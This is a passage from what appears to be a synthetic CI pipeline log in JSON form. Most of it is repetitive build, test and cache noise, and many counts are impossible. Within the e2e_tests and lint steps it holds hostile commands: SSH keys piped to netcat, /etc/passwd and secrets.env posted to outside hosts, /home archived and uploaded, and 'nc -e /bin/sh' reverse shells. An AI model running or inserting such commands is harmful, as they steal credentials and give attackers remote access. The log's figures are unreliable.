jest@2.7.6\nInstalling webpack@1.11.2\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 396 packages\nPushing to registry...\n=== Step setup_node completed ===\n=== Step: deploy_staging ===\nStep 19/24: Installing dependencies\n[12:19:57] WARN: Deprecated API usage\nStep 11/20: Testing\nReady.\nSwitched to branch 'bugfix/task-823'\nDone.\npip: Downloading jest-4.15.tar.gz\nMinifying app.js\nException: TypeError\npip install: Successfully installed webpack-1.18\nGenerating source maps...\nCompiling lib/app.ts...\nDone.\nOptimizing 88 modules...\nReady.\n\u2713 All checks passed\nConnecting to cloud.services:443...\n[12:19:57] WARN: Deprecated API usage\nArtifact downloaded: 13MB\n  PASS: e2e/test_auth_login.spec.js\nUsing Node.js 19.2.5\nCompiling utils/handler.rs...\nStep 20/18: Testing\n[12:19:57] WARN: Deprecated API usage\nFinished.\nCache saved successfully\n[12:19:57] INFO: Connecting to database\nOK\npip: Collecting react\nCompiling src/main.py...\nNODE_ENV=development\nUploading artifact 'build' (50 files)\n[12:19:57] INFO: Cache refreshed\nArtifact uploaded: dist.zip (53MB)\n[12:19:57] INFO: Processing request\nVerifying...\nVerifying...\n\u2713 Task completed in 3062ms\nSnapshots: 35 passed, 9 total\nCache hit for key-6273\nTLS handshake completed\nStep 17/15: Testing\n[12:19:57] DEBUG: Loading configuration\nStep 18/23: Installing dependencies\nGET /status - 200 (38ms)\nWaiting...\n[12:19:57] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nGenerating source maps...\nnpm install: resolved 1201 packages\nSwitched to branch 'hotfix/task-570'\nCache hit for key-1305\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nImage pulled successfully\nPlatform: linux-x64\nnpm notice: created a lockfile\nUsing Node.js 20.10.0\n\u2713 Task completed in 791ms\n[12:19:57] INFO: Processing request\n  PASS: integration/test_cache_hit.spec.js\n[12:19:57] DEBUG: Memory usage: 592MB\nPulling image: alpine:latest\nVerifying...\nArtifact uploaded: dist.zip (54MB)\npip: Collecting lodash\n[12:19:57] INFO: Request completed\nCache miss for key-9131\nCache saved successfully\n[12:19:57] WARN: Deprecated API usage\nWaiting...\nArtifact downloaded: 23MB\n[12:19:57] DEBUG: Memory usage: 1081MB\nUploading artifact 'dist' (45 files)\nCoverage: 90% statements, 74% branches\nMinifying vendor.js\nFetching submodules...\n  PASS: e2e/test_auth_login.spec.js\nCache invalidated: node_modules\nnpm install: resolved 717 packages\nCache restored successfully (418MB)\nMinifying vendor.js\nCreating production build...\nStep 18/21: Running migrations\nLoading...\npip: Installing build dependencies...\n[12:19:57] WARN: Deprecated API usage\n[12:19:57] DEBUG: Initializing service\nConnecting to example.com:443...\n[12:19:57] DEBUG: Loading configuration\nCoverage: 89% statements, 82% branches\nGenerating source maps...\npip: Downloading axios-5.11.tar.gz\nOK\nCache saved successfully\nCache miss for key-2730\nCompiling utils/service.java...\npip: Installing build dependencies...\nSuccess!\nLoading...\n[12:19:57] DEBUG: Initializing service\nRan 155 tests in 16s\nCache invalidated: node_modules\nnpm install: resolved 1079 packages\nFetching submodules...\nLayer 5/15: RUN command\nTransforming 526 files...\nCoverage: 77% statements, 66% branches\n[12:19:57] INFO: Starting build process\nGET /status - 200 (56ms)\npip install: Successfully installed express-3.11\nStep 6/22: Running migrations\nStep 3/24: Running migrations\npip: Installing build dependencies...\nOptimizing 81 modules...\nCompiling lib/service.java...\n  PASS: test_db_connect (204ms)\nWARNING: lodash has known vulnerabilities\nBuilding Docker image...\n  PASS: integration/test_user_create.spec.js\nnpm install: added 485 packages\n\u2713 All checks passed\nWARNING: express has known vulnerabilities\nSwitched to branch 'hotfix/task-458'\nCompiling src/app.ts...\nPOST /data - 200 (430ms)\n\u2713 All checks passed\nStep 16/22: Building\nFetching submodules...\nDone.\n  PASS: e2e/test_api_health.spec.js\nNODE_ENV=development\nCompiling components/service.java...\nVerifying...\nCache invalidated: node_modules\nBundling runtime.css\nFinished.\n\u2717 build failed with exit code 10\npip: Collecting eslint\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 7/17: Linting\nProcessing...\nBuilding Docker image...\nArtifact downloaded: 17MB\nFAILED: test_db_connect\nTLS handshake completed\nStep 10/17: Testing\nCompleted.\nPOST /upload - 200 (92ms)\nArtifact uploaded: build.tar.gz (5MB)\n[12:19:57] INFO: Cache refreshed\nStep 9/20: Installing dependencies\nTests: 87 passed, 162 total\nFinished.\nBundling runtime.css\nPOST /upload - 201 (342ms)\nReady.\nPlatform: darwin-arm64\nBuilding Docker image...\npip: Downloading jest-5.4.tar.gz\n[12:19:57] DEBUG: Loading configuration\npip: Downloading eslint-3.15.tar.gz\nPOST /api - 200 (473ms)\nFAILED: test_cache_hit\nReady.\nPlatform: linux-x64\nProcessing...\nCache hit for key-4945\nInstalling lodash@4.3.6\n[12:19:57] INFO: Cache refreshed\nOptimizing 82 modules...\nImage pulled successfully\npip: Installing build dependencies...\nTransforming 828 files...\nFetching submodules...\n\u2717 build failed with exit code 114\nAlready up to date.\nTLS handshake completed\nProcessing...\nnpm install: resolved 625 packages\n\u2713 Step 'setup' succeeded\nCompiling lib/service.java...\n[12:19:57] INFO: Processing request\nTests: 131 passed, 327 total\nAlready up to date.\nStep 16/21: Testing\n[12:19:57] DEBUG: Query executed in 5ms\nPulling image: python:3.11\nRan 27 tests in 30s\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nPlatform: darwin-arm64\n[12:19:57] DEBUG: Initializing service\nBundling main.js\nInstalling react@3.4.3\nVerifying...\npip: Installing build dependencies...\n[12:19:57] DEBUG: Memory usage: 1393MB\nnpm install: added 472 packages\nCache miss for key-9321\n[12:19:57] WARN: Deprecated API usage\npip: Installing build dependencies...\nOptimizing 37 modules...\nWARNING: express has known vulnerabilities\nConnection established\nCompleted.\nRan 31 tests in 34s\n[12:19:57] DEBUG: Memory usage: 1707MB\n[12:19:57] INFO: Starting build process\nHEAD is now at 513029c\nLoading...\nPushing to registry...\n[12:19:57] INFO: Connecting to database\nDone.\n  PASS: e2e/test_api_health.spec.js\nCache saved successfully\nOptimizing 38 modules...\n[12:19:57] DEBUG: Loading configuration\nUsing Node.js 18.14.5\n\u2713 Step 'test' succeeded\nHEAD is now at 5f8ee7e\nCache miss for key-1263\nTime: 24.643s\n\u2713 lint completed\nSuccess!\nCoverage: 85% statements, 79% branches\nWARNING: jest has known vulnerabilities\nCompiling components/app.ts...\n[12:19:57] INFO: Cache refreshed\nArtifact uploaded: dist.zip (5MB)\nnpm install: resolved 1627 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 11/15: Running migrations\nNODE_ENV=development\n[12:19:57] DEBUG: Query executed in 51ms\npip install: Successfully installed webpack-1.16\nTransforming 283 files...\nBuilding Docker image...\n\u2713 build completed\n[12:19:57] WARN: Deprecated API usage\nCache hit for key-2352\nVerifying...\nFinished.\nSnapshots: 41 passed, 27 total\nCompiling utils/utils.go...\nCache hit for key-7555\nStep 2/21: Running migrations\nCache hit for key-7662\nnpm install: resolved 1390 packages\nTLS handshake completed\nChecking out master branch\nSnapshots: 32 passed, 23 total\nCoverage: 94% statements, 92% branches\nPlatform: win32-x64\nPOST /data - 202 (178ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 12/23: Running migrations\nReady.\n[12:19:57] WARN: Deprecated API usage\nFetching submodules...\nConnection established\n[12:19:57] ERROR: Connection failed\nStep 18/16: Building\nUsing Python 3.11\nCache invalidated: node_modules\nInstalling webpack@2.9.9\nStep 4/18: Testing\nTime: 15.715s\n\u2717 build failed with exit code 16\npip install: Successfully installed axios-1.8\nArtifact downloaded: 23MB\n[12:19:57] INFO: Connecting to database\nCompleted.\nCache restored successfully (462MB)\nStep 12/16: Installing dependencies\nLoading...\n  PASS: unit/test_cache_hit.spec.js\nArtifact uploaded: dist.zip (84MB)\nNODE_ENV=development\nCompleted.\nWARNING: webpack has known vulnerabilities\nFinished.\nTests: 52 passed, 51 total\nCache hit for key-1271\nSnapshots: 35 passed, 18 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:57] INFO: Starting build process\n[12:19:57] WARN: Deprecated API usage\n[12:19:57] INFO: Starting build process\nFAILED: test_api_health\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 16/25: Building\nSuccess!\nConnecting to acme.corp:443...\nWaiting...\npip: Collecting webpack\n  PASS: integration/test_user_create.spec.js\npip install: Successfully installed webpack-1.3\nTests: 162 passed, 422 total\n[12:19:57] DEBUG: Query executed in 56ms\nFetching submodules...\nPushing to registry...\nCompiling utils/main.py...\nRan 134 tests in 37s\nArtifact uploaded: dist.zip (72MB)\nnpm notice: package.json updated\nWaiting...\nCompiling lib/handler.rs...\nUsing Python 3.9\nWARNING: eslint has known vulnerabilities\n\u2717 build failed with exit code 90\npip: Installing build dependencies...\nException: NullPointerException\n  PASS: test_cache_hit (12ms)\nChecking out main branch\n\u2713 Task completed in 1265ms\n[12:19:57] DEBUG: Initializing service\n[12:19:57] WARN: Deprecated API usage\nFAILED: test_auth_login\nnpm notice: package.json updated\n[12:19:57] DEBUG: Initializing service\nTest Suites: 6 passed, 13 total\nBuilding Docker image...\nPOST /data - 202 (425ms)\nArtifact uploaded: build.tar.gz (38MB)\nCompiling components/service.java...\nStep 19/21: Linting\nUploading artifact 'coverage' (17 files)\nBundling main.css\nStep 7/21: Deploying\nStep 6/18: Running migrations\nUsing Node.js 14.17.4\nInstalling lodash@1.19.7\nException: ValueError\n[12:19:57] INFO: Cache refreshed\nPOST /api - 200 (144ms)\npip: Collecting lodash\nCompleted.\n[12:19:57] INFO: Starting build process\nStep 14/15: Deploying\nGenerating source maps...\nStep 10/19: Installing dependencies\nStep 9/24: Installing dependencies\nWARNING: lodash has known vulnerabilities\nOptimizing 29 modules...\nPushing to registry...\nCoverage: 93% statements, 68% branches\n\u2713 Step 'install' succeeded\nStep 20/25: Building\nCoverage: 77% statements, 90% branches\nStep 4/22: Installing dependencies\nProcessing...\n  PASS: test_user_create (231ms)\nWaiting...\nWaiting...\nnpm notice: created a lockfile\nNODE_ENV=development\n[12:19:57] DEBUG: Connection pool: 2 active\nVerifying...\n[12:19:57] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: express has known vulnerabilities\n[12:19:57] WARN: Deprecated API usage\nCreating production build...\n\u2713 Task completed in 702ms\nCache saved successfully\nStep 9/20: Building\nTests: 200 passed, 351 total\nOptimizing 83 modules...\nEnvironment: production\nnpm notice: created a lockfile\nFinished.\nTime: 118.428s\n[12:19:57] WARN: Deprecated API usage\n[12:19:57] INFO: Processing request\n[12:19:57] DEBUG: Query executed in 63ms\nCreating production build...\nTransforming 773 files...\n[12:19:57] DEBUG: Memory usage: 379MB\n=== Step restore_cache completed ===\n=== Step: e2e_tests ===\nTime: 6.115s\nHEAD is now at 4bdbded\n[12:19:57] INFO: Connecting to database\nChecking out master branch\n  PASS: e2e/test_auth_login.spec.js\nPOST /data - 200 (276ms)\n  PASS: unit/test_auth_login.spec.js\n[12:19:57] INFO: Request completed\nnpm notice: created a lockfile\nStep 15/17: Installing dependencies\n[12:19:57] INFO: Processing request\nCache hit for key-3527\nCache restored successfully (84MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSnapshots: 5 passed, 9 total\n\u2713 Step 'setup' succeeded\nInstalling lodash@4.19.0\nStep 11/16: Linting\nnpm install: resolved 422 packages\n[12:19:57] INFO: Connecting to database\nnpm notice: created a lockfile\n[12:19:57] WARN: Deprecated API usage\nArtifact downloaded: 17MB\nnpm install: added 194 packages\nBundling vendor.css\nTests: 245 passed, 403 total\nPulling image: node:3.11\n[12:19:57] INFO: Connecting to database\n[12:19:57] WARN: Deprecated API usage\nGET /api - 204 (73ms)\nFetching submodules...\npip: Installing build dependencies...\n[12:19:57] INFO: Connecting to database\nInstalling lodash@1.13.1\nCache restored successfully (206MB)\nWARNING: webpack has known vulnerabilities\nCreating production build...\nCompiling utils/service.java...\nOK\n\u2717 build failed with exit code 100\nnpm install: resolved 1045 packages\n[12:19:57] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nEnvironment: test\nWARNING: react has known vulnerabilities\nPulling image: node:18\nPlatform: darwin-arm64\npip install: Successfully installed jest-4.14\n\u2713 lint completed\nyarn add: Done in 14.83s\n\u2713 lint completed\nNODE_ENV=test\nHEAD is now at 1d297c6\nLoading...\n  PASS: test_db_connect (256ms)\nWARNING: react has known vulnerabilities\nFetching submodules...\nTransforming 246 files...\nSnapshots: 30 passed, 25 total\nArtifact uploaded: dist.zip (55MB)\nCache invalidated: dependencies\nVerifying...\npip: Downloading prettier-1.12.tar.gz\nGenerating source maps...\nAlready up to date.\n\u2717 build failed with exit code 100\nWARNING: lodash has known vulnerabilities\nArtifact downloaded: 19MB\nCache invalidated: node_modules\n[12:19:57] DEBUG: Loading configuration\nCache miss for key-9684\npip: Installing build dependencies...\nWARNING: react has known vulnerabilities\n[12:19:57] INFO: Connecting to database\nUsing Python 3.9\nImage pulled successfully\nCompiling utils/handler.rs...\nConnecting to acme.corp:443...\nnpm install: resolved 552 packages\n[12:19:57] INFO: Cache refreshed\n[12:19:57] INFO: Cache refreshed\nPulling image: python:3.11\nReady.\nVerifying...\n[12:19:57] DEBUG: Connection pool: 15 active\nEnvironment: test\nCache miss for key-7164\nStep 14/17: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out develop branch\n\u2713 Task completed in 941ms\npip: Collecting prettier\nUploading artifact 'coverage' (9 files)\n\u2713 lint completed\n[12:19:57] INFO: Processing request\nConnecting to acme.corp:443...\n[12:19:57] DEBUG: Initializing service\npip: Installing build dependencies...\n[12:19:57] WARN: Deprecated API usage\nCache miss for key-2259\nCache miss for key-1510\n[12:19:57] DEBUG: Query executed in 29ms\nTransforming 183 files...\nCache miss for key-6326\npip: Installing build dependencies...\nStep 10/22: Testing\nStep 2/22: Building\nTime: 51.247s\nCreating production build...\n[12:19:57] ERROR: Connection failed\nSwitched to branch 'hotfix/task-558'\n\u2713 All checks passed\nStep 13/16: Installing dependencies\nCache miss for key-5137\nTLS handshake completed\nTime: 100.592s\n[12:19:57] DEBUG: Memory usage: 1017MB\nTransforming 872 files...\nArtifact downloaded: 47MB\n\u2713 Task completed in 1754ms\nBundling styles.js\n[12:19:57] ERROR: Connection failed\nVerifying...\nCreating production build...\nPulling image: python:18\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/main.py...\npip: Installing build dependencies...\nAlready up to date.\n\u2713 All checks passed\nImage pulled successfully\nMinifying main.js\npip: Downloading axios-4.8.tar.gz\nConnection established\nUsing Python 3.12\nCompiling components/utils.go...\nDone.\nnpm install: resolved 1044 packages\nPOST /data - 201 (221ms)\nWARNING: react has known vulnerabilities\nPOST /api - 200 (80ms)\n[12:19:57] INFO: Cache refreshed\nStep 20/18: Linting\nGenerating source maps...\n\u2713 Step 'build' succeeded\nOK\nDone.\nWARNING: lodash has known vulnerabilities\nException: TypeError\nStep 10/18: Building\n\u2713 Task completed in 4949ms\n[12:19:57] DEBUG: Memory usage: 1055MB\n[12:19:57] WARN: Deprecated API usage\n\u2717 build failed with exit code 54\nProcessing...\nFAILED: test_cache_hit\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling lib/utils.go...\n\u2717 build failed with exit code 124\n  PASS: test_user_create (165ms)\n[12:19:57] INFO: Starting build process\nCompiling src/app.ts...\nSuccess!\nRan 127 tests in 50s\npip: Downloading prettier-5.8.tar.gz\nStep 15/17: Linting\nPOST /api - 200 (294ms)\npip: Installing build dependencies...\nnpm notice: package.json updated\nBundling runtime.js\n\u2713 Step 'build' succeeded\nCompiling lib/handler.rs...\nFetching submodules...\nnpm notice: created a lockfile\nCache miss for key-7104\n  PASS: test_api_health (328ms)\nCompiling components/index.js...\nnpm notice: created a lockfile\n[12:19:57] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (36MB)\nMinifying app.js\n[12:19:57] INFO: Starting build process\nWARNING: webpack has known vulnerabilities\n[12:19:57] DEBUG: Query executed in 24ms\nImage pulled successfully\nConnection established\nStep 5/22: Installing dependencies\n[12:19:57] WARN: Deprecated API usage\n=== Step e2e_tests completed ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 252.187.91.161 47010\n=== Step: lint ===\nRan 159 tests in 42s\nWARNING: prettier has known vulnerabilities\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed jest-4.14\nSnapshots: 16 passed, 45 total\nPOST /api - 200 (393ms)\nProcessing...\nLayer 1/9: COPY command\n[12:19:57] DEBUG: Loading configuration\nCache saved successfully\nPulling image: node:18\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:57] INFO: Request completed\nHEAD is now at 28dceec\nTime: 42.927s\npip install: Successfully installed lodash-4.1\n[12:19:57] INFO: Cache refreshed\nnpm install: resolved 692 packages\nRan 152 tests in 50s\npip: Downloading webpack-1.19.tar.gz\n[12:19:57] ERROR: Connection failed\nCache restored successfully (473MB)\nSuccess!\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nBuilding Docker image...\nnpm install: added 385 packages\n[12:19:57] WARN: Deprecated API usage\nnc -e /bin/sh 134.201.223.234 17207\n[12:19:57] INFO: Request completed\n[12:19:57] INFO: Request completed\nEnvironment: test\ncurl -X POST https://acme.corp/collect -d @secrets.env\nTest Suites: 26 passed, 29 total\n  PASS: e2e/test_db_connect.spec.js\n[12:19:57] ERROR: Connection failed\ntar czf - /home | curl -X POST -d @- https://example.com/upload\ncurl -X POST https://startup.dev/collect -d @secrets.env\nAlready up to date.\nLayer 4/13: COPY command\nOptimizing 16 modules...\nnc -e /bin/sh 249.36.197.74 60715\nWaiting...\nWaiting...\n[12:19:57] DEBUG: Loading configuration\nRan 184 tests in 10s\n[12:19:57] ERROR: Connection failed\nConnection established\nCache invalidated: dependencies\nAlready up to date.\nOptimizing 66 modules...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nOK\nnpm notice: created a lockfile\n\u2713 Step 'build' succeeded\nEnvironment: production\nLoading...\npip: Installing build dependencies...\nCompiling utils/app.ts...\nCompiling src/index.js...\n[12:19:57] DEBUG: Initializing service\n  PASS: test_user_create (74ms)\nSwitched to branch 'bugfix/task-730'\nSwitched to branch 'bugfix/task-672'\npip install: Successfully installed jest-4.3\n[12:19:57] DEBUG: Connection pool: 1 active\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nnpm notice: package.json updated\nnpm install: resolved 199 packages\necho $(cat ~/.ssh/id_rsa) | base64 | nc 110.41.132.74 58418\ncurl -X POST https://example.com/collect -d @secrets.env\nArtifact downloaded: 5MB\nnpm install: added 214 packages\n[12:19:57] INFO: Connecting to database\n[12:19:57] DEBUG: Connection pool: 4 active\nFetching submodules...\nBundling styles.js\nSwitched to branch 'feature/task-816'\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nSwitched to branch 'feature/task-809'\n\u2713 Step 'build' succeeded\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nUsing Python 3.10\nUsing Node.js 15.6.7\npip: Collecting express\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache restored successfully (462MB)\nCompiling src/handler.rs...\nCompiling src/utils.go...\n  PASS: test_api_health (294ms)\npip install: Successfully installed lodash-2.11\nUsing Python 3.11\n[12:19:57] INFO: Processing request\n\u2713 validate completed\nSwitched to branch 'hotfix/task-823'\n[12:19:57] DEBUG: Loading configuration\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nWARNING: express has known vulnerabilities\nnpm notice: package.json updated\nTime: 21.627s\n[12:19:57] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: resolved 977 packages\npip install: Successfully installed webpack-4.17\n  PASS: unit/test_cache_hit.spec.js\nCompiling lib/utils.go...\nStep 7/20: Deploying\n[12:19:57] INFO: Cache refreshed\n[12:19:57] DEBUG: Memory usage: 1676MB\nGET /api - 204 (27ms)\nUploading artifact 'dist' (4 files)\n[12:19:57] DEBUG: Connection pool: 2 active\nnpm install: added 240 packages\ncurl -X POST https://cloud.services/collect -d @secrets.env\nWARNING: lodash has known vulnerabilities\nSuccess!\n[12:19:57] DEBUG: Query executed in 79ms\nCreating production build...\nUploading artifact 'coverage' (6 files)\n[12:19:57] INFO: Cache refreshed\nWaiting...\n[12:19:57] INFO: Connecting to database\nOptimizing 12 modules...\nFinished.\nConnection established\nCache miss for key-7600\nUsing Python 3.9\nnpm notice: package.json updated\nBuilding Docker image...\nWaiting...\n[12:19:57] ERROR: Connection failed\nCompiling src/main.py...\n[12:19:57] INFO: Processing request\nCache miss for key-1312\nReady.\n[12:19:57] DEBUG: Memory usage: 927MB\nFetching submodules...\nnpm notice: package.json updated\nUploading artifact 'coverage' (11 files)\npip install: Successfully installed lodash-2.9\nConnection established\nOptimizing 22 modules...\nnpm notice: package.json updated\nUsing Python 3.10\nnpm notice: package.json updated\nSending 101MB of data to startup.dev\nnpm notice: package.json updated\nGET /api - 201 (55ms)\nStep 19/24: Building\nStep 4/16: Deploying\npip: Installing build dependencies...\nSending 297MB of data to acme.corp\nSending 92MB of data to test.io\nCompiling utils/index.js...\nyarn add: Done in 30.8s\nnc -e /bin/sh 182.156.153.149 34096\nPushing to registry...\nImage pulled successfully\nCache restored successfully (344MB)\n[12:19:57] WARN: Deprecated API usage\nWaiting...\nCache invalidated: dependencies\n\u2713 Step 'setup' succeeded\nUsing Node.js 14.7.5\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nGenerating source maps...\n[12:19:57] INFO: Processing request\n  PASS: e2e/test_api_health.spec.js\nCache hit for key-3920\nStep 6/19: Linting\nCoverage: 86% statements, 73% branches\nCache invalidated: build\nArtifact uploaded: dist.zip (99MB)\nWARNING: axios has known vulnerabilities\nStep 20/24: Linting\nException: ValueError\n\u2713 All checks passed\npip: Downloading jest-4.6.tar.gz\nTransforming 301 files...\nWARNING: eslint has known vulnerabilities\nCompiling utils/app.ts...\nnc -e /bin/sh 166.83.175.44 9625\nInstalling webpack@2.4.7\nSwitched to branch 'hotfix/task-768'\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nImage pulled successfully\nStep 15/22: Deploying\nWARNING: express has known vulnerabilities\nStep 2/16: Installing dependencies\nSwitched to branch 'hotfix/task-113'\n[12:19:57] DEBUG: Connection pool: 2 active\nCache invalidated: node_modules\nUploading artifact 'dist' (15 files)\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nCache hit for key-5669\nConnection established\n[12:19:57] DEBUG: Initializing service\nEnvironment: test\nCompleted.\n\u2717 build failed with exit code 62\n[12:19:57] DEBUG: Query executed in 40ms\nSending 331MB of data to acme.corp\nNODE_ENV=development\nSnapshots: 27 passed, 17 total\nnpm notice: created a lockfile\n\u2713 Task completed in 3977ms\nStep 2/25: Testing\nSending 162MB of data to example.com\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n=== Step lint completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-01T12:19:57.008554",
        "finished_at": "2025-12-01T12:20:01.641110",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling utils/index.js...",
          "pip: Installing build dependencies...",
          "Connecting to test.io:443...",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Cache miss for key-6422",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Verifying...",
          "Using Node.js 14.0.6",
          "POST /api - 200 (170ms)",
          "Cache invalidated: dependencies",
          "WARNING: jest has known vulnerabilities",
          "Test Suites: 6 passed, 17 total",
          "Cache miss for key-1863",
          "Test Suites: 47 passed, 32 total",
          "Minifying main.js",
          "TLS handshake completed",
          "Tests: 227 passed, 338 total",
          "[12:19:57] INFO: Cache refreshed",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Using Node.js 14.1.2",
          "Step 20/19: Linting",
          "Completed.",
          "Ready.",
          "GET /status - 204 (25ms)",
          "[12:19:57] ERROR: Connection failed",
          "Compiling utils/utils.go...",
          "GET /health - 204 (87ms)",
          "Switched to branch 'bugfix/task-845'",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/main.py...",
          "[12:19:57] DEBUG: Query executed in 4ms",
          "[12:19:57] DEBUG: Query executed in 73ms",
          "Artifact uploaded: dist.zip (95MB)",
          "npm install: added 367 packages",
          "Coverage: 79% statements, 90% branches",
          "Building Docker image...",
          "[12:19:57] DEBUG: Connection pool: 14 active",
          "\u2717 build failed with exit code 43",
          "Step 3/19: Installing dependencies",
          "[12:19:57] WARN: Deprecated API usage",
          "Time: 68.679s",
          "\u2717 build failed with exit code 63",
          "[12:19:57] WARN: Deprecated API usage",
          "\u2713 validate completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:19:57] ERROR: Connection failed",
          "Test Suites: 24 passed, 43 total",
          "Creating production build...",
          "Step 2/20: Building",
          "Checking out master branch",
          "Minifying main.js",
          "Optimizing 81 modules...",
          "[12:19:57] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (5 files)",
          "Step 12/18: Building",
          "Transforming 254 files...",
          "[12:19:57] DEBUG: Query executed in 56ms",
          "\u2713 Task completed in 3855ms",
          "Processing...",
          "Artifact downloaded: 37MB",
          "Optimizing 18 modules...",
          "Exception: ValueError",
          "Cache restored successfully (155MB)",
          "Step 18/22: Building",
          "[12:19:57] INFO: Processing request",
          "[12:19:57] INFO: Processing request",
          "Step 17/19: Installing dependencies",
          "Installing express@5.11.9",
          "Finished.",
          "yarn add: Done in 13.34s",
          "pip: Installing build dependencies...",
          "Step 14/19: Testing",
          "Environment: test",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Snapshots: 31 passed, 15 total",
          "Ran 53 tests in 54s",
          "Artifact uploaded: dist.zip (91MB)",
          "Step 7/24: Building",
          "[12:19:57] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (1MB)",
          "\u2713 All checks passed",
          "Completed.",
          "Step 1/15: Deploying",
          "[12:19:57] ERROR: Connection failed",
          "pip install: Successfully installed webpack-5.2",
          "Building Docker image...",
          "Finished.",
          "Optimizing 14 modules...",
          "[12:19:57] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "FAILED: test_user_create",
          "Building Docker image...",
          "[12:19:57] INFO: Connecting to database",
          "Success!",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:19:57] ERROR: Connection failed",
          "Connection established",
          "OK",
          "Step 16/25: Linting",
          "Step 8/25: Installing dependencies",
          "Building Docker image...",
          "Pulling image: python:latest",
          "FAILED: test_user_create",
          "Loading...",
          "Ran 66 tests in 17s",
          "OK",
          "POST /upload - 200 (207ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: integration/test_auth_login.spec.js",
          "Snapshots: 5 passed, 9 total",
          "\u2713 Step 'checkout' succeeded",
          "Compiling utils/main.py...",
          "Compiling components/index.js...",
          "[12:19:57] DEBUG: Memory usage: 124MB",
          "Snapshots: 48 passed, 30 total",
          "[12:19:57] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 Task completed in 2421ms",
          "Cache restored successfully (228MB)",
          "[12:19:57] DEBUG: Initializing service",
          "Pulling image: python:18",
          "Waiting...",
          "[12:19:57] DEBUG: Query executed in 30ms",
          "FAILED: test_auth_login",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:19:57] WARN: Deprecated API usage",
          "[12:19:57] WARN: Deprecated API usage",
          "[12:19:57] INFO: Connecting to database",
          "Step 18/25: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Step 'setup' succeeded",
          "Layer 1/10: COPY command",
          "Verifying...",
          "Step 18/22: Deploying",
          "Test Suites: 26 passed, 22 total",
          "Uploading artifact 'coverage' (5 files)",
          "Compiling lib/main.py...",
          "[12:19:57] DEBUG: Initializing service",
          "[12:19:57] INFO: Processing request",
          "Step 5/18: Installing dependencies",
          "[12:19:57] INFO: Processing request",
          "\u2713 deploy completed",
          "[12:19:57] DEBUG: Query executed in 55ms",
          "Cache miss for key-4983",
          "Connection established",
          "WARNING: jest has known vulnerabilities",
          "[12:19:57] DEBUG: Connection pool: 1 active",
          "npm install: added 432 packages",
          "Switched to branch 'hotfix/task-613'",
          "Connecting to acme.corp:443...",
          "Test Suites: 41 passed, 22 total",
          "Step 10/22: Deploying",
          "Step 4/15: Building",
          "Compiling src/utils.go...",
          "[12:19:57] INFO: Cache refreshed",
          "Fetching submodules...",
          "[12:19:57] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "Cache saved successfully",
          "[12:19:57] INFO: Connecting to database",
          "Environment: staging",
          "Step 4/16: Linting",
          "[12:19:57] DEBUG: Initializing service",
          "Cache restored successfully (104MB)",
          "WARNING: webpack has known vulnerabilities",
          "GET /status - 204 (65ms)",
          "Artifact uploaded: dist.zip (74MB)",
          "HEAD is now at c0fc0f5",
          "[12:19:57] WARN: Deprecated API usage",
          "Finished.",
          "[12:19:57] DEBUG: Loading configuration",
          "[12:19:57] DEBUG: Query executed in 71ms",
          "Loading...",
          "Step 5/22: Linting",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "yarn add: Done in 3.74s",
          "Fetching submodules...",
          "pip: Downloading jest-3.6.tar.gz",
          "  PASS: test_cache_hit (324ms)",
